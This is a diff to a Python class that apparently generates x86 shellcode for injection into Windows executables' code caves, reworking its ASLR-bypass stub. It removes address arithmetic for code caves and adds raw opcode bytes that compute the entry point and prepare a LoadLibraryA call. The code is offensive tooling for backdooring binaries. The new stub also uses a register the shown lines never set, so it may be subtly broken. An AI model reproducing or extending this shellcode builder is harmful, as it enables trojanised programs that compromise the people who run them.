@@ -545,44 +545,12 @@ class winI32_shellcode():
 
         #### BEGIN ASLR BYPASS ####
         # This works because we know the original entry point of the application and
-        # where we are supposed to be as we control where our shellcode goes
+        # where we are supposed to be as we control where the shellcode goes
         self.shellcode1 = "\xfc"   # CLD
         self.shellcode1 += "\xbb"  # mov value below ebx
-
-        if flItms['NewCodeCave'] is True:
-            if 'CodeCaveVirtualAddress' in flItms:
-
-                #Current address if not in ASLR
-                self.shellcode1 += struct.pack("<I", (flItms['CodeCaveVirtualAddress'] +
-                                                      len(self.shellcode1) +
-                                                      len(self.stackpreserve) +
-                                                      flItms['buffer'] + 201
-                                                      )
-                                               )
-            else:
-                self.shellcode += '\x00x\x00\x00\x00'
-        else:
-            if flItms['CavesPicked'] == {}:
-                self.shellcode1 += '\x00\x00\x00\x00'
-            else:
-                for section in flItms['Sections']:
-                    if section[0] == flItms['CavesPicked'][0][0]:
-                        VirtualLOCofSection = section[2]
-                        diskLOCofSection = section[4]
-
-                #Current address if not in ASLR
-                self.shellcode1 += struct.pack("<I", int(flItms['CavesPicked'][0][1], 16) -
-                                               diskLOCofSection +
-                                               VirtualLOCofSection +
-                                               flItms['ImageBase'] +
-                                               len(self.shellcode1) +
-                                               len(self.stackpreserve) +
-                                               9)
-
-        self.shellcode1 += "\xe8\x00\x00\x00\x00"
-        self.shellcode1 += "\x5e"           # pop esi
-        self.shellcode1 += "\x2b\xf3"       # sub esi,ebx
-        self.shellcode1 += "\x83\xfe\x00"   # cmp esi,0
+        self.shellcode1 += struct.pack("<I", flItms['AddressOfEntryPoint'] + flItms['ImageBase'])
+        self.shellcode1 += "\x29\xDA"       # sub edx, ebx
+        self.shellcode1 += "\x83\xFA\x00"   # cmp edx, 0
         self.shellcode1 += "\xbb"           # mov value below to EBX
         self.shellcode1 += struct.pack("<I", flItms['LoadLibraryA'])
         self.shellcode1 += "\xb9"  # mov value below to ECX
